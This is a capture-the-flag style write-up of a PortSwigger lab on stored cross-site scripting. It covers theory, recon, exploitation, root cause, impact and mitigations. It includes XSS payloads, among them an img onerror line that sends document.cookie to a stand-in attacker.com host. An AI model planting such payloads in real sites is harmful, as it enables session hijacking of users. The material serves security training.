# Stored XSS - HTML Context

## Lab Link
https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

## Difficulty
Apprentice

## Vulnerability Type
Cross-Site Scripting (XSS) - Stored

## Theory
Stored XSS (Persistent XSS) occurs when attacker input is saved in the application's database/storage and then served to other users. Unlike reflected XSS which is immediately executed, stored XSS affects multiple users over time.

Example: Comment sections, product reviews, user profiles where input is stored and displayed to all users.

## Recon Process
1. Identify input fields that store data (comments, profiles, posts)
2. Test HTML injection with simple tags: `<h1>test</h1>`
3. Check if tags render in database and display
4. Test JavaScript: `<img src=x onerror="alert('XSS')">`
5. Verify alert appears when page reloads

## Exploitation Steps

### Step 1: Find Storage Point
- Locate form that stores user input (comments, feedback, etc.)
- Note field names and form submission method

### Step 2: Inject Payload
- Submit form with payload: `<script>alert('Stored XSS')</script>`
- Observe successful submission

### Step 3: Confirm Persistence
- Reload page
- Verify alert appears without user interaction
- Alert indicates payload is stored and executed for all users

### Step 4: Advanced Exploitation
```javascript
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```
This silently exfiltrates cookies to attacker's server.

## Root Cause
- Unsanitized user input stored in database
- No HTML encoding when displaying stored data
- Missing input validation on storage
- No Content Security Policy

## Impact
- **Persistent Attacks:** Single payload affects all users indefinitely
- **Widespread Compromise:** All users accessing the content are affected
- **Session Hijacking:** Stealing cookies from multiple users
- **Worm Potential:** XSS payload can self-replicate

## Mitigations
1. **HTML Encode on Output**
   ```php
   echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
   ```

2. **Validate on Input**
   - Whitelist acceptable HTML tags
   - Strip dangerous content (script tags, event handlers)

3. **Content Security Policy**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Use Templating with Auto-Escape**
   - Enable auto-escaping in templates
   - Use mature frameworks with built-in XSS protection

5. **Regular Expression Filtering**
   - Remove `<script>` tags and event handlers
   - Consider using libraries like DOMPurify

## Key Difference from Reflected XSS
Stored XSS doesn't require phishing the user with a malicious link - the payload is already in the application waiting for victims.
